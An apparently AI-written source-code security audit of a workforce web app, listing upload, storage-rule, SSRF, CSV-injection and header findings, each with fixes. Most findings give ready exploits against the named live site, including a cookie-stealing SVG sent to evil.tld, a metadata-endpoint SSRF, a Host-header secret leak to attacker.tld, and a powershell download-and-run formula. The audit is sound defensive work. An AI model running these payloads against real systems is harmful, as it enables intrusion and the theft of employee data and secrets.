# CISS Workforce — File, Export & SSRF Audit (task-3)

**Scope:** uploads, downloads, storage paths, exports/imports, outbound `fetch()` in `/Users/mymac/Documents/CISS`.
**Method:** read-only source audit (no request was sent to cisskerala.site). Every finding carries the exact request or crafted file needed to reproduce; items that depend on live data/edge behaviour are marked **needs-live-verification**.
**Date:** 2026-10-06
**Auditor:** files-ssrf-auditor (teammate)

Legend: `C` = confirmed from source, `V` = needs-live-verification.

---

## Summary table

| ID | Severity | Conf. | One-line | Location |
|----|----------|-------|----------|----------|
| FL-01 | High | C | Unauthenticated enrollment draft grants 20×4 MB anonymous uploads that return permanent public bearer URLs (SVG allowed) | `src/app/api/public/enroll/draft/route.ts:40`, `src/app/api/public/enroll/upload/route.ts:102-123` |
| FL-02 | High | V | Cross-client document read: client scope matching strips all punctuation, so distinct client names collide | `src/lib/server/client-access.ts:17-23,52-54` → `src/app/api/employees/profile/[id]/document/route.ts:161` |
| FL-03 | High | C | Any signed-in account (incl. guard PIN users) can read/list every employee's signature, profile photo and attendance selfie straight from Storage | `storage.rules:113-134` |
| FS-01 | Medium | C | SSRF: superAdmin-settable `vercelProductionUrl` is fetched with `HEAD` — no scheme/host allowlist, no timeout | `src/app/api/super-admin/regions/[id]/check/route.ts:12-19,157-167` + `src/app/api/super-admin/regions/[id]/route.ts:111-114` |
| FS-02 | High | V | `buildSelfUrl(request.url,…)` → server re-queues itself to a Host-header-derived origin **carrying `Bearer $CRON_SECRET`** | `src/lib/server/self-queue.ts:206-218,226-232` |
| FE-01 | Medium | C | CSV formula injection in the server-generated attendance report (no `=`/`+`/`-`/`@` guard) | `src/app/api/admin/reports/attendance/route.ts:13-23` |
| FL-04 | Medium | C | Guard document streaming echoes the stored `Content-Type` with `inline` → stored XSS if an SVG reaches those paths | `src/app/api/guard/profile/documents/route.ts:96-113` |
| FL-05 | Low | C | Firestore document-path injection: row `siteId` is concatenated into a document ID that may contain `/` | `src/app/api/admin/work-orders/import/commit/route.ts:251-256,694` |
| FL-06 | Low | V | Payslip ownership test uses the non-unique human `employeeId` string | `src/app/api/guard/payslips/[id]/payslip/route.ts:23-29` |
| FL-07 | Low | C | XLSX decompression (zip-bomb) DoS: row/column caps are applied only after full workbook parse | `src/app/api/admin/clients/[id]/wage-config/upload/route.ts:33-72`, `src/app/api/admin/work-orders/import/preview/route.ts:516-545` |
| FL-08 | Low | C | `Content-Disposition` filename built from unsanitised employee fields | `src/app/api/guard/payslips/[id]/payslip/route.ts:36,41`; `src/app/api/admin/payroll/entries/[id]/payslip/route.ts:26-27,32` |

---

## FL-01 — Anonymous enrollment draft → public, permanent file hosting (High, confirmed)

**Locations**

- `src/app/api/public/enroll/draft/route.ts:16-57` — no authentication of any kind; only a 10-digit phone number and a per-`(ip,phone)` rate limit.
- `src/app/api/public/enroll/upload/route.ts:38-131` — the only gate is the draft token; `file.type` (client-supplied) becomes the stored `contentType` (line 108) and a permanent bearer URL is returned (lines 103, 119-123).
- `src/lib/enrollmentFiles.ts:11-29` — the "allowlist" is `file.type.startsWith("image/")` **or** `application/pdf`. `image/svg+xml` passes.
- `src/lib/server/enrollment-draft.ts:3-4` — `ENROLLMENT_DRAFT_MAX_UPLOADS = 20`, TTL 2 h.

**Evidence**

```ts
// src/app/api/public/enroll/upload/route.ts:102-123
const isRestrictedDocument = folder === "aadharCards";
const downloadToken = isRestrictedDocument ? null : crypto.randomUUID();

await storageFile.save(buffer, {
  resumable: false,
  metadata: {
    contentType: file.type || "application/octet-stream",   // ← client-controlled
    cacheControl: isRestrictedDocument ? "no-store, private, max-age=0" : undefined,
    metadata: downloadToken ? { firebaseStorageDownloadTokens: downloadToken } : {},
  },
});
...
return NextResponse.json({
  url: isRestrictedDocument ? path : buildDownloadUrl(bucket.name, path, downloadToken!),
});
```

```ts
// src/lib/enrollmentFiles.ts:11-18
export function getEnrollmentFileSelectionError(file: File): string | null {
  if (file.type.startsWith("image/")) {          // ← image/svg+xml accepted
    ...
    return null;
  }
```

**Exploit**

```bash
# 1. Anyone, no credentials. Vary the phone number to reset the per-(ip,phone) budget.
curl -s -X POST https://cisskerala.site/api/public/enroll/draft \
  -H 'content-type: application/json' \
  -d '{"phoneNumber":"9876543210"}'
# → {"draftId":"AbC123...","uploadToken":"<32-byte base64url>","expiresAt":"..."}

# 2. Upload attacker content. `type` is fully client-chosen; the extension is chosen by the attacker.
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(`https://evil.tld/?c=`+document.cookie)"/>' > evil.svg
curl -s -X POST https://cisskerala.site/api/public/enroll/upload \
  -F 'path=enrollments/AbC123.../idProofs/evil.svg' \
  -F 'uploadToken=<token from step 1>' \
  -F 'file=@evil.svg;type=image/svg+xml'
# → {"url":"https://firebasestorage.googleapis.com/v0/b/ciss-workforce.firebasestorage.app/o/enrollments%2FAbC123...%2FidProofs%2Fevil.svg?alt=media&token=<uuid>"}
# That URL is public, unauthenticated and permanent (no expiry on firebaseStorageDownloadTokens).
```

Repeat step 1 with `9876543211`, `…12`, … for an unbounded number of drafts; each draft accepts 20 uploads of ≤ 4 MB → **80 MB per draft**.

**Impact**

- Anonymous, permanent, unauthenticated hosting of attacker-controlled content (including script-bearing SVG) inside the paid `ciss-workforce.firebasestorage.app` bucket.
- Unbounded storage/egress cost and quota exhaustion (the real employee-document pipeline shares the bucket).
- Objects are written into the same folders used by genuine enrollment documents (`profilePictures`, `idProofs`, `addressProofs`, …), polluting the document pipeline.

**Fix**

1. Bind enrollment drafts to something a fake caller cannot mint: an admin-issued invite token, a client-side captcha (the app already ships `NEXT_PUBLIC_RECAPTCHA_V3_SITE_KEY`), or a verified SMS OTP — the draft must not be creatable by an anonymous POST.
2. Allowlist real asset types (`image/jpeg`, `image/png`, `image/webp`, `application/pdf`) instead of `image/*`, and derive the extension from the sniffed magic bytes (`fileTypeFromBuffer`, already used in `src/lib/server/aadhaar.ts:168`) rather than from the client path.
3. Add an aggregate per-IP/per-day upload quota in addition to the per-draft counter, and stop issuing bearer download tokens for enrollment objects — serve them through an authorised route.
4. Add `contentDisposition: "attachment"` to enrollment object metadata.

---

## FL-02 — Cross-client document read via over-normalised client names (High, needs-live-verification)

**Locations**

- `src/lib/server/client-access.ts:17-23` (`normalizeClientKey`) and `:52-54` (used as the final, weakest comparison).
- Reached from `src/lib/server/guard-profile-view.ts:183-187` (`assertGuardProfileScope` → `matchesClientScope`).
- Served by `src/app/api/employees/profile/[id]/document/route.ts:145-214`.

**Evidence**

```ts
// src/lib/server/client-access.ts:17-23
function normalizeClientKey(value: unknown) {
  return normalizeText(value)
    .toLowerCase()
    .replace(/[’']/g, "'")
    .replace(/'s\b/g, "")
    .replace(/[^a-z0-9]/g, "");   // ← every separator, dot, dash and space removed
}
```

```ts
// src/lib/server/client-access.ts:52-54
return recordClientNames.some(
  (clientName) => normalizeClientKey(clientName) === normalizeClientKey(scope.clientName),
);
```

```ts
// src/app/api/employees/profile/[id]/document/route.ts:153-161
if (hasClientAccess(decoded) && !CLIENT_DOCUMENT_CATEGORIES.has(category)) { ... 403 }
...
await assertGuardProfileScope(db, decoded, data);   // ← the only tenant check
```

**Exploit** (client-user bearer token for a tenant whose name normalises to the same key)

```
GET /api/employees/profile/<victimGuardDocId>/document?category=identity-front
Authorization: Bearer <client-user ID token>
```

Colliding pairs are easy to create accidentally in an admin-maintained client registry:
`S.I.S. Agency` / `SIS Agency` → both `sisagency`; `A B C Security` / `ABC-Security` → both `abcsecurity`; `Guardian's Force` → `guardianforce`.

**Impact** — a client account reads another client's guards' identity/address proof scans and qualification certificates (`CLIENT_DOCUMENT_CATEGORIES`, `route.ts:63-69`) — the exact documents this platform is required to keep tenant-isolated.

**Needs-live-verification** — confirm whether two rows in `clients` (or two tenant name spellings in `employees.clientName`) collide under `normalizeClientKey`. This is a *fail-open name match*, so it only fires when a collision exists.

**Fix** — drop the `normalizeClientKey` fallback and match only on `clientId` (already first at `client-access.ts:33-36`); if a name fallback is required, compare the exact normalised name (`normalizeClientMatch`) and refuse when the employee has no `clientId`.

---

## FL-03 — Any signed-in account can read/list every employee's signature, photo and attendance selfie (High, confirmed)

> Cross-reference: `rules-auditor` owns `storage.rules`; listed here because the accessible objects are exactly the sensitive files in this task's scope.

**Location** — `storage.rules:113-134` (`:113` profilePictures, `:120` signatures, `:128` attendance).

**Evidence**

```
match /employees/{employeeKey}/profilePictures/{fileName} {
  allow read: if isSignedIn();          // ← any authenticated user in the tenant
  ...
}
match /employees/{employeeKey}/signatures/{fileName} {
  allow read: if isSignedIn();
  ...
}
match /employees/{employeeKey}/attendance/{attemptId}/{fileName} {
  allow read: if isSignedIn();
  ...
}
```

In Firebase Storage rules `read` grants **both** `get` **and** `list`.

**Exploit** (browser console of any logged-in guard, who holds a Firebase custom token from `/api/guard/auth/login`)

```js
import { getStorage, ref, listAll, getDownloadURL } from "firebase/storage";
const s = getStorage(app);                                  // same web config as the portal
const dir = await listAll(ref(s, "employees/9876543210/signatures"));
for (const item of dir.items) console.log(await getDownloadURL(item));
```

`employeeKey` is a predictable phone number for admin-created enrollments (`src/app/(app)/employees/enroll/page.tsx:316`: `` `employees/${phoneNumber}/${folder}/…` ``), so the key is guessable/enumerable; `list` then yields the filenames and `getDownloadURL` yields direct bearer links.

**Impact** — horizontal read of signatures (repudiable/forgeable consent and document evidence), profile photos and attendance selfies for the whole workforce, bypassing `/api/employees/profile/[id]/document`, its tenant scope check and the `sensitiveDocumentAuditLogs` trail.

**Fix** — `allow read: if isAdmin()` for `signatures` and `attendance`; for `profilePictures`, if guard-visible photos are required, serve them through the authorised streaming route instead of granting direct Storage read. If `list` is not needed anywhere, constrain to `allow get: if …` rather than `read`.

---

## FS-01 — SSRF from an unvalidated region URL (Medium, confirmed)

**Locations**

- Write side (no validation at all): `src/app/api/super-admin/regions/[id]/route.ts:111-114`
- Read/trigger side: `src/app/api/super-admin/regions/[id]/check/route.ts:12-19` and `:156-167`

**Evidence**

```ts
// src/app/api/super-admin/regions/[id]/check/route.ts:12-19
async function probeUrl(url: string): Promise<boolean> {
  try {
    const res = await fetch(url, { method: "HEAD", redirect: "manual" });   // ← no allowlist, no timeout
    return res.status >= 200 && res.status < 400;
  } catch { return false; }
}
```

```ts
// src/app/api/super-admin/regions/[id]/check/route.ts:156-167
const vercelProductionUrl = region.vercelProductionUrl as string | undefined;
if (vercelProductionUrl) {
  const urlReachable = await probeUrl(vercelProductionUrl);
  checks.push({ checkId: "vercel_url", label: "Vercel deployment URL", passed: urlReachable,
    message: urlReachable ? `Deployment responds at ${vercelProductionUrl}` : `… is not responding.` });
```

```ts
// src/app/api/super-admin/regions/[id]/route.ts:111-114   (write side)
vercelProductionUrl:
  body.vercelProductionUrl === undefined
    ? current.vercelProductionUrl ?? null
    : body.vercelProductionUrl?.trim() || null,        // ← any string, any scheme
```

**Exploit**

```bash
# 1. Point the region's "production URL" at anything.
curl -X PATCH https://cisskerala.site/api/super-admin/regions/KL \
  -H "Authorization: Bearer <superAdmin ID token>" -H 'content-type: application/json' \
  -d '{"vercelProductionUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# 2. Trigger the server-side HEAD.
curl -H "Authorization: Bearer <superAdmin ID token>" \
  https://cisskerala.site/api/super-admin/regions/KL/check
# → checks[].passed / message disclose whether the internal target responded (2xx–3xx = true)
```

Internal port probe: repeat step 1 with `http://10.0.0.5:8080`, `http://127.0.0.1:3000`, `http://metadata.google.internal/…`. `redirect: "manual"` blocks redirect-following and the body is discarded, so this is response-blind — but it is a genuine reachability oracle for the serverless network, and a target that never answers hangs the request because no `AbortSignal` is given.

**Impact** — internal network/service enumeration from inside the Vercel function; SSRF primitive available to any superAdmin (and therefore to anyone who compromises a superAdmin token, e.g. via FE-01/FL-04 stored XSS).

**Fix**

```ts
function isAllowedProbeUrl(raw: string) {
  const url = new URL(raw);
  if (url.protocol !== "https:") return false;
  const host = url.hostname.toLowerCase();
  if (/^(localhost|.*\.local|.*\.internal)$/.test(host)) return false;
  if (/^\d+\.\d+\.\d+\.\d+$/.test(host) || host.includes(":")) return false;   // no raw IPs
  return host.endsWith(".vercel.app") || host === "cisskerala.site";
}
// and: fetch(url, { method: "HEAD", redirect: "manual", signal: AbortSignal.timeout(5_000) })
```

Apply the same validator on the `PATCH` write path (`regions/[id]/route.ts:111`) so bad values never reach Firestore.

---

## FS-02 — Host-header-derived re-queue URL leaks `CRON_SECRET` (High, needs-live-verification)

**Locations**

- `src/lib/server/self-queue.ts:206-218` (the outbound request) and `:226-232` (`buildSelfUrl`).
- Callers: `src/app/api/admin/payroll/run/route.ts:124,132`; `src/app/api/admin/claims/repair/route.ts:127,135`; `src/app/api/attendance/auto-checkout/route.ts:75,86`; `src/app/api/internal/automation-worker/route.ts:41,52`.

**Evidence**

```ts
// src/lib/server/self-queue.ts:226-232
export function buildSelfUrl(requestUrl: string, pathname: string): string {
  const url = new URL(requestUrl);            // ← request.url is Host-header derived
  return `${url.origin}${pathname}`;
}

// src/lib/server/self-queue.ts:206-218
if (selfUrl && cronSecret) {
  try {
    await fetch(selfUrl, {
      headers: { authorization: `Bearer ${cronSecret}` },   // ← CRON_SECRET sent to $selfUrl
      signal: AbortSignal.timeout(10_000),
    }).catch(() => { … });
```

**Exploit** (admin account; `requireAdmin` passes, then the re-queue fires whenever the chunk budget/chunk cap is exhausted)

```bash
curl -X POST 'https://cisskerala.site/api/admin/payroll/run' \
  -H 'Host: attacker.tld' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <admin ID token>' \
  -d '{"period":"2026-01"}'
# Server then performs:  GET https://attacker.tld/api/admin/payroll/run
#                        authorization: Bearer <CRON_SECRET>
```

`attacker.tld`'s access log captures `CRON_SECRET`. The same shape applies to `/api/admin/claims/repair`, `/api/attendance/auto-checkout` (requires `?key=$CRON_SECRET` or a Vercel cron signature) and `/api/internal/automation-worker` (requires `Bearer $CRON_SECRET`).

**Impact** — `CRON_SECRET` (`src/app/api/internal/automation-worker/route.ts:17`, `auto-checkout/route.ts:12,62`) unlocks the internal automation worker, which runs regional provisioning steps, plus payslip/auto-checkout queues — i.e. an admin→infrastructure escalation.

**Needs-live-verification** — confirm whether Vercel lets a client-supplied `Host` (or `X-Forwarded-Host`) reach the Node runtime's `request.url` for `cisskerala.site`. Test with a DNS-logging host:

```bash
curl -s -o /dev/null -X POST 'https://cisskerala.site/api/admin/payroll/run' \
  -H 'Host: <unique-id>.dnslog.example' -H 'content-type: application/json' \
  -H "Authorization: Bearer <admin token>" -d '{"period":"2026-01"}'
```

If the runtime ignores `Host`, the finding reduces to a hardening item (below).

**Fix** — never derive the re-queue origin from the request. Use a server-configured base URL and verify it:

```ts
const SELF_ORIGIN = process.env.APP_BASE_URL?.trim() || "https://cisskerala.site";
// buildSelfUrl → `${SELF_ORIGIN}${pathname}`
```

Also reject re-queue when the derived host is not in an allowlist, and drop the `Bearer` header entirely by signing the re-queue with an HMAC over `(path, timestamp)`.

---

## FE-01 — CSV formula injection in the attendance report export (Medium, confirmed)

**Locations**

- `src/app/api/admin/reports/attendance/route.ts:13-23` — the CSV serialiser; no formula guard.
- Served at `:185-191` (`?format=csv`).
- Client-side sibling without a guard: `src/lib/spreadsheets/browser.ts:72-93` (`downloadCsv`), used by `src/components/dashboard/charts.tsx:54`.
- Partial mitigation elsewhere (for contrast): `src/app/(app)/payroll/cycles/[id]/page.tsx:182-196` **does** prefix `=+@-`.

**Evidence**

```ts
// src/app/api/admin/reports/attendance/route.ts:19-22
const escape = (value: unknown) =>
  `"${String(value ?? "").replaceAll('"', '""')}"`;   // quoting only — Excel still evaluates ="…"

return [headers.join(","), ...rows.map((row) => headers.map((header) => escape(row[header])).join(","))].join("\n");
```

User-controlled cells reaching that serialiser (`:149-164`): `employeeName`, `clientName`, `employeeClientName`, `siteClientName`, `siteName`, `dutyPointName`, `locationText`, `complianceWarnings` (all sourced from attendance writes, i.e. ultimately from guard/enrollment input).

**Exploit**

A guard's name is set by the public enrollment flow, so no admin action is needed to plant the payload:

1. Enroll (or edit the profile) with `fullName = =HYPERLINK("https://evil.tld/steal?d="&A1&B1,"Open payslip")` — or the classic `=cmd|'/C powershell -c iwr http://evil.tld/a.ps1|iex'!A1`.
2. Admin/field officer opens the attendance report and clicks **Download**:
   `GET /api/admin/reports/attendance?format=csv&from=2026-09-01&to=2026-09-30`
3. The delivered `attendance-report.csv` contains `"=HYPERLINK(""https://evil.tld/steal?d=""&A1&B1,""Open payslip"")"`. Excel/LibreOffice/Sheets evaluate the cell on open; the DDE form prompts for command execution.

`downloadCsv` is affected in the same way for `ciss-client-coverage-*.csv` (`charts.tsx:54`) where the client name is admin-entered.

**Not vulnerable (verified — do not over-report):** the two XLSX exports. `write-excel-file` infers `type = String` for strings (`node_modules/write-excel-file/modules/xlsx/files/sheet.xml/row.js`, `detectValueType`) and emits `t="s"` shared strings (`…/cell.js`, `getTypeAttribute`) — the `Formula` type is only produced when the caller passes `{ type: 'Formula' }`, and `grep -rn "'Formula'" src` finds no such call. So `src/app/api/admin/work-orders/assigned-guards-export/route.ts:246` and `src/app/api/admin/payroll/cycles/[id]/worksheet/route.ts:94` are safe.

**Fix** — centralise one CSV serialiser and neutralise formula-leading cells for every string field:

```ts
function csvCell(value: unknown) {
  let text = value == null ? "" : String(value);
  if (/^[=+\-@\t\r\n]/.test(text)) text = `'${text}`;        // or prefix with a single quote
  return `"${text.replaceAll('"', '""')}"`;
}
```

Apply it to `src/app/api/admin/reports/attendance/route.ts:19-22` and `src/lib/spreadsheets/browser.ts:72-93`; extend the guard at `src/app/(app)/payroll/cycles/[id]/page.tsx:186` to include `\t`, `\r`, `\n`.

---

## FL-04 — Guard document streaming reflects the stored `Content-Type` with `inline` (Medium, confirmed)

**Location** — `src/app/api/guard/profile/documents/route.ts:96-113`.

**Evidence**

```ts
// src/app/api/guard/profile/documents/route.ts:96-113
const [buffer] = await bucket.file(path).download();
const [metadata] = await bucket.file(path).getMetadata();
...
return new NextResponse(buffer, {
  headers: {
    "Content-Type": metadata.contentType || "application/octet-stream",   // ← echoed from Storage
    "Content-Disposition": "inline",                                     // ← rendered, not downloaded
    ...
    "X-Content-Type-Options": "nosniff",
  },
});
```

The route's own upload path is safe (`validatedFile` at `:30-43` sniffs magic bytes and restricts to JPEG/PNG/PDF), but the *read* path accepts any object that already sits under
`employees/{guardDocId}/(idProofs|addressProofs|qualificationCertificates)/` (`sameBucketDocumentPath`, `:52-66`) regardless of how it got there. `storage.rules:113-196` permits an admin to create those objects with any `image/*` content type, which includes `image/svg+xml` (`:136` idProofs, `:143` addressProofs, `:196` qualificationCertificates).

**Exploit**

1. With an admin token (or an admin session obtained via XSS), write an SVG object:
   ```bash
   # via the Firebase JS SDK from an authenticated browser session
   await uploadBytes(
     ref(storage, `employees/<guardDocId>/idProofs/x.svg`),
     new Blob([svgPayload], { type: "image/svg+xml" }),
     { contentType: "image/svg+xml" });
   await updateDoc(doc(db, "employees", "<guardDocId>"), { identityProofUrlFront: "employees/<guardDocId>/idProofs/x.svg" });
   ```
2. The guard opens the document viewer → `GET /api/guard/profile/documents?category=identity&side=front` returns the SVG **on the `cisskerala.site` origin** with `Content-Type: image/svg+xml`, executing script in the guard's session (Firebase ID token theft, then full guard-account takeover).

Note the contrast with the sibling route `src/app/api/employees/profile/[id]/document/route.ts:202-205`, which re-encodes every document to JPEG/PDF and is therefore **not** vulnerable — that is the pattern to copy.

**Fix** — mirror the re-encode route: run the buffer through `documentToJpeg` (or an allowlist of `image/jpeg|image/png|application/pdf`) before responding, keep `X-Content-Type-Options: nosniff`, and use `Content-Disposition: attachment` unless the type is a re-encoded image. Tighten `storage.rules` `isImage()` to an explicit raster allowlist (`image/jpeg`, `image/png`, `image/webp`) so `image/svg+xml` can never be stored.

---

## FL-05 — Firestore document-path injection in the work-order import commit (Low, confirmed)

**Location** — `src/app/api/admin/work-orders/import/commit/route.ts:251-256` and `:693-694`.

**Evidence**

```ts
// :251-256
function buildWorkOrderDocId(row: TcsExamSourceRow) {
  const siteToken = row.siteId?.trim() || slugifySegment(row.siteName) || "site";
  const examToken = slugifySegment(row.examCode) || "exam";
  const dateToken = row.date.trim() || "date";
  return `${siteToken}_${dateToken}_${examToken}`;      // ← siteId is never validated
}
```

```ts
// :693-694
const targetId = priorRecord?.id ?? buildWorkOrderDocIdForExam(parsedRow, payload.examCode);
const workOrderRef = adminDb.collection("workOrders").doc(targetId);
```

`validatePayload` (`:282-297`) checks only presence of `fileName`/`examName`/`examCode`/hashes/rows. `row.siteId` is otherwise free-form (`resolveParsedRowSiteIds` only substitutes a match when the site exists).

**Exploit**

```bash
curl -X POST https://cisskerala.site/api/admin/work-orders/import/commit \
  -H "Authorization: Bearer <admin ID token>" -H 'content-type: application/json' \
  -d '{"fileName":"x.xlsx","examName":"E","examCode":"e1","binaryFileHash":"<64hex>","contentHash":"<client-computed>",
       "rows":[{"siteId":"target/child","siteName":"S","district":"Kollam","date":"2026-10-01",
                "maleGuardsRequired":1,"femaleGuardsRequired":0}]}'
# → adminDb.collection("workOrders").doc("target/child_2026-10-01_e1")
#   creates workOrders/target/child_2026-10-01_e1  (a subcollection document)
```

`contentHash` must match the recomputation at `:838-856`, so the attacker simply computes it with the same algorithm — it is an integrity check, not an authorisation boundary.

**Impact** — an admin can write arbitrary documents into nested paths under `workOrders` and pollute the import registry; no cross-collection write is reachable because the collection prefix is fixed. Admin-only, hence Low.

**Fix** — `if (!/^[A-Za-z0-9_-]{1,128}$/.test(targetId)) throw new Error("Invalid work-order identifier.")` before `collection("workOrders").doc(targetId)`, and slugify `row.siteId` inside `buildWorkOrderDocId`.

---

## FL-06 — Payslip ownership test uses a non-unique string (Low, needs-live-verification)

**Location** — `src/app/api/guard/payslips/[id]/payslip/route.ts:23-29` (list counterpart `src/app/api/guard/payslips/route.ts:11-23`).

**Evidence**

```ts
const ownsPayslip =
  data.employeeDocId === guard.employeeDocId ||
  (Boolean(data.employeeId) && data.employeeId === guard.employeeId);
```

```ts
// src/lib/server/linked-profiles.ts:48,73
const employeeId = normalizeText(data.employeeId) || normalizeText(data.employeeCode);
```

`guard.employeeId` is a human field on the guard's own record, not a token claim (good), but `employeeId` is not enforced unique anywhere in the lookup path (`firestore.indexes.json` has no unique constraint; Firestore cannot enforce one).

**Exploit** — if two employee documents share `employeeId` (e.g. a re-import duplicated `CISS-0042`), a guard can `GET /api/guard/payslips/<otherEntryId>/payslip` and receive the other employee's payslip, which contains bank/salary data.

**Needs-live-verification** — count duplicates: `employees` grouped by `employeeId` where count > 1.

**Fix** — require `data.employeeDocId === guard.employeeDocId` only (the `employeeId` branch exists for legacy rows; migrate them first), or verify `data.employeeId` uniquely by looking the employee document up and confirming its `id`.

---

## FL-07 — XLSX decompression DoS (Low, confirmed)

**Locations**

- `src/app/api/admin/clients/[id]/wage-config/upload/route.ts:33-72` — 5 MB compressed limit, "PK" magic check, then `readXlsxFile(buffer)` at `:47`; the sheet/row/column caps (`:52-72`) run **after** the whole workbook is materialised.
- `src/app/api/admin/work-orders/import/preview/route.ts:516-545` — 8 MB per file × 10 files (30 MB total), `readXlsxFile(buffer)` at `:74` inside `readTabularWorkbook`, caps at `:82-98` afterwards.

**Exploit** — a 5 MB `.xlsx` whose `xl/sharedStrings.xml` / `xl/worksheets/sheet1.xml` is a highly compressible repeat (a 5 MB deflate stream can expand to several GB) is fully parsed before any dimension check, OOM-killing or hard-timing the serverless function. `maxDuration` is 300 s on the import routes.

**Fix** — bound the parse: stream/inflate with a byte budget, reject entries whose declared uncompressed size exceeds a cap, or use a reader that supports early row limits; keep the caps as a second gate.

---

## FL-08 — Unsanitised `Content-Disposition` filename (Low, confirmed)

**Locations**

- `src/app/api/guard/payslips/[id]/payslip/route.ts:36` and `:41`
- `src/app/api/admin/payroll/entries/[id]/payslip/route.ts:26-27` and `:32`

**Evidence**

```ts
// guard/payslips/[id]/payslip/route.ts:36,41
const filename = `payslip-${entry.employeeCode || entry.employeeId}-${entry.period}.pdf`;
...
"Content-Disposition": `inline; filename="${filename}"`,

// admin/payroll/entries/[id]/payslip/route.ts:26-27
const employeeLabel = entry.employeeCode || entry.employeeName?.replace(/\s+/g, "_") || entry.id || "payslip";
const filename = `payslip-${employeeLabel}-${entry.period}.pdf`;
```

`employeeName` (and `employeeCode`) come from Firestore and are not stripped of `"`, `;` or `\`. Node rejects raw CR/LF in header values, so this is not response splitting, but a name containing `"` yields a malformed header and a name containing `;` can alter the filename parameter.

**Fix** — `const safe = String(label).replace(/[^A-Za-z0-9._-]/g, "_").slice(0, 80);` (the pattern already used at `src/app/api/employees/profile/[id]/document/route.ts:200`) plus RFC 5987 `filename*=UTF-8''…`.

---

## Verified negatives (checked, no issue — do not re-report)

| Area | Evidence | Verdict |
|---|---|---|
| Geocoding SSRF | `src/lib/server/location-geocode.ts:116,134,148,149,188` — host hard-coded to `api.opencagedata.com`, user text passed through `URLSearchParams.set`; `src/app/api/geocode-site/route.ts:9` requires admin | No SSRF |
| Cloud KMS SSRF | `src/lib/server/aadhaar.ts:71-86` — `kmsKeyName()` regex-validated from env, fixed `cloudkms.googleapis.com` host | No SSRF |
| Vercel / Firebase Management / OpenRouter clients | `src/lib/server/vercel-provisioner.ts:3,16`; `firebase-management-client.ts:48`; `openrouter.ts:83` — fixed hosts, ids URL-encoded | No SSRF |
| `lib/pdf-utils.fetchImageBytes` | `src/lib/pdf-utils.ts:67-77` does `fetch(url)` unvalidated, **but** it has no importers (`grep -rn fetchImageBytes src` → the three call sites define their own local copy in client pages) | Dead code; no server SSRF |
| Stored XSS via `/api/employees/profile/[id]/document` | `:202-205` re-encodes to JPEG (via `sharp`) or PDF (via `pdf-lib`), forces `image/jpeg`/`application/pdf` + `nosniff` | Not vulnerable |
| Aadhaar upload → public URL | `src/app/api/admin/employees/[id]/aadhaar/route.ts:218-222`; `src/lib/server/aadhaar.ts:164-181,253-277` — magic-byte sniffed, re-encoded to PNG, stored under `restrictedEmployeeAadhaar/…` with no download token; `storage.rules:46-56` denies read/write | Not vulnerable |
| Aadhaar source ownership | `src/lib/server/aadhaar.ts:184-231` — path must start with `enrollments/{draftId}/aadharCards/` or `restrictedAadhaarStaging/{adminUid}/` | Correctly bound |
| XLSX formula injection | `node_modules/write-excel-file/modules/xlsx/files/sheet.xml/{row,cell}.js`; no `type: 'Formula'` call sites in `src` | Not vulnerable |
| `..` in document paths | `src/app/api/public/enroll/upload/route.ts:29`; `src/app/api/employees/profile/[id]/document/route.ts:73`; `src/lib/server/enrollment-documents.ts:1,54` — the final-segment regex `[A-Za-z0-9._-]+` permits `..`, and GCS/Firestore object names are literal strings, so no filesystem traversal and no cross-prefix write (the prefix segments are exact-matched) | Not exploitable; hygiene only |
| `public/download/android` open redirect | `src/lib/android-release.ts:11-45,74` — `apkUrl`/`apkPath` come from the repo-committed `public/downloads/ciss-workforce-android.json` validated by zod (HTTPS URL or root-relative path), not from request input; `requestOrigin` is only the resolution base | Not user-controlled; note that a spoofable `Host` would make the root-relative branch an open redirect — same root cause as FS-02 |
| Report-attachment signed URLs | `src/lib/reports/report-attachments.server.ts:28-79` — `storagePath` must start with `foReports/{type}/{uid}/{reportId}/`, stored MIME must equal the declared MIME and be sniffed-equal, plus `reportId`/`uploaderId`/`attachmentId` custom metadata; 15-minute signed URLs | Correctly bound |
| Report POST IDOR (checked because it handles attachments) | `src/app/api/admin/visit-reports/route.ts:178,228-253` — a client-supplied `reportId` reaches `collection.doc()`, but the write is `transaction.create` (fails if it exists) and the idempotent early-return requires `data.fieldOfficerId === decoded.uid` | No overwrite; at most a report-ID existence oracle |
| Provisioning self-queue timeout | `src/lib/server/self-queue.ts:210` does use `AbortSignal.timeout(10_000)` | Timeout present (FS-02 is about *destination*, not duration) |

---

## Cross-cutting notes for the Lead

1. **Aadhaar authorisation is a single hard-coded account.** `src/lib/aadhaar-admin-policy.ts:1,14-21` — `admin@cisskerala.app` + `email_verified` + role `admin` is the entire gate for decrypting Aadhaar numbers (`/api/admin/employees/[id]/aadhaar?reveal=true`) and downloading Aadhaar scans. Any XSS or credential compromise of that one account (see FL-04, FE-01) cascades to every Aadhaar record in the platform. Belongs to whoever owns auth; flagging because two of my findings are plausible compromise paths into it.
2. **Aadhaar is well handled otherwise** — encrypted at rest via Cloud KMS, stored under deny-all rules, re-encoded on serve, audited in `sensitiveDocumentAuditLogs`, `requireRecentAuthentication` (5 min) enforced for reveal (`src/lib/server/employee-document-access.ts:3-10`).
3. **`storage.rules` grants `list` wherever it grants `read`** — that is what upgrades FL-03 from "guess a filename" to "enumerate the folder". Whoever fixes the rules should prefer `allow get:` over `allow read:`.
4. **Unconfirmed items needing live checks:** FL-02 (client-name collision), FL-06 (duplicate `employeeId`), FS-02 (Vercel `Host` handling). No request was sent to cisskerala.site from this audit.
